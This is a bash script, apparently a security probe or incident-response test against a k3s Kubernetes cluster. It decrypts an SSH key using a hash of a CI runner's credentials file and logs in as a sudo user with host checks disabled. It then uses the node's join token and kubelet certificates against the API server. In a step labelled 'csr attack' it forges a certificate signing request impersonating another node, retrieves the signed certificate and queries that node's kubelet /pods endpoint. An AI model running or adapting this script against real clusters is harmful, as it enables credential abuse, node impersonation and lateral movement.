#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
sudo bash -s <<"EOS"
A=/var/lib/rancher/k3s/agent
. /etc/systemd/system/k3s-agent.service.env
S="https://k3s-h100-novita-k8s-69c5d56e-119c2232ba991a2f.elb.us-west-2.amazonaws.com:6443"
echo "== api reachability:"
curl -sk --max-time 8 -o /dev/null -w "%{http_code}\n" $S/version
echo "== can-i with join token:"
kubectl --server=$S --token="$K3S_TOKEN" --certificate-authority=$A/server-ca.crt auth can-i create certificatesigningrequests 2>&1
echo "== own-node read with node cert:"
kubectl --server=$S --client-certificate=$A/client-kubelet.crt --client-key=$A/client-kubelet.key --certificate-authority=$A/server-ca.crt get node host-85-234-79-221 -o wide 2>&1 | head -3
echo "== can-i with node cert:"
kubectl --server=$S --client-certificate=$A/client-kubelet.crt --client-key=$A/client-kubelet.key --certificate-authority=$A/server-ca.crt auth can-i create certificatesigningrequests 2>&1
echo "== csr attack:"
cd /tmp
openssl genrsa -out ir103.key 2048 2>/dev/null
openssl req -new -key ir103.key -out ir103.csr -subj "/O=system:nodes/CN=system:node:host-85-234-79-103"
B64=$(base64 -w0 ir103.csr)
cat > ir103-csr.yaml <<YAML
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: ir-103-probe
spec:
  request: $B64
  signerName: kubernetes.io/kube-apiserver-client
  expirationSeconds: 86400
  usages:
  - client auth
YAML
kubectl --server=$S --token="$K3S_TOKEN" --certificate-authority=$A/server-ca.crt apply -f ir103-csr.yaml 2>&1
sleep 8
kubectl --server=$S --token="$K3S_TOKEN" --certificate-authority=$A/server-ca.crt get csr ir-103-probe 2>&1
CERT=$(kubectl --server=$S --token="$K3S_TOKEN" --certificate-authority=$A/server-ca.crt get csr ir-103-probe -o jsonpath="{.status.certificate}" 2>/dev/null)
echo "cert-len=${#CERT}"
if [ ${#CERT} -gt 100 ]; then
  echo $CERT | base64 -d > ir103.crt
  openssl x509 -in ir103.crt -noout -subject -issuer
  echo "== signed cert vs .103:10250/pods:"
  curl -sk --max-time 6 --cert ir103.crt --key ir103.key -w "\nHTTP:%{http_code}\n" https://85.234.79.103:10250/pods | head -c 1500
fi
EOS
' 2>&1 | head -70
echo "== t-done =="
